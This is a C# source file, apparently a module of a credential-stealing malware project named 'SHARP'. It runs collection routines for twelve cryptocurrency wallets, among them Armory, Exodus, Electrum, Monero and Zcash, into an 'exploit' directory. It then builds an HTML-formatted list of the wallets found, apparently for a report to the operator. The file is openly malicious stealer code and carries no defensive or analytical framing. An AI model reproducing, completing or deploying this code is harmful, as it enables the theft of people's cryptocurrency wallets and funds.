using System;
using System.Threading.Tasks;

namespace SHARP
{
    internal class StartWallets
    {
      public static async Task Start()
      {
        string exploitDir = Help.ExploitDir;
        try
        {
          Armory.ArmoryStr(exploitDir);
          AtomicWallet.AtomicStr(exploitDir);
          BitcoinCore.BCStr(exploitDir);
          Bytecoin.BCNcoinStr(exploitDir);
          DashCore.DSHcoinStr(exploitDir);
          Electrum.EleStr(exploitDir);
          Ethereum.EcoinStr(exploitDir);
          LitecoinCore.LitecStr(exploitDir);
          Monero.XMRcoinStr(exploitDir);
          Exodus.ExodusStr(exploitDir);
          Zcash.ZecwalletStr(exploitDir);
          Jaxx.JaxxStr(exploitDir);
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex?.ToString() + "кошельки :(");
        }
      }

      public static string getAllWallets()
      {
        string str = "";
        if (Counting.armory > 0)
          str += "<b>Armory</b> ,";
        if (Counting.atomicwallet > 0)
          str += "<b>AtomicWallet</b> ,";
        if (Counting.bitcoincore > 0)
          str += "<b>BitcoinCore</b> ,";
        if (Counting.bytecoin > 0)
          str += "<b>Bytecoin</b> ,";
        if (Counting.dashcore > 0)
          str += "<b>DashCore</b> ,";
        if (Counting.electrum > 0)
          str += "<b>Electrum</b> ,";
        if (Counting.etherium > 0)
          str += "<b>Etherium</b> ,";
        if (Counting.exodus > 0)
          str += "<b>Exodus</b> ,";
        if (Counting.jaxx > 0)
          str += "<b>Jaxx</b> ,";
        if (Counting.litecoincore > 0)
          str += "<b>LitecoinCore</b> ,";
        if (Counting.metamask > 0)
          str += "<b>Metamask</b> ,";
        if (Counting.monero > 0)
          str += "<b>Monero</b> ,";
        if (Counting.zcash > 0)
          str += "<b>Zcash</b> ,";
        return str.Substring(0, str.Length - 2);
      }
    }
}
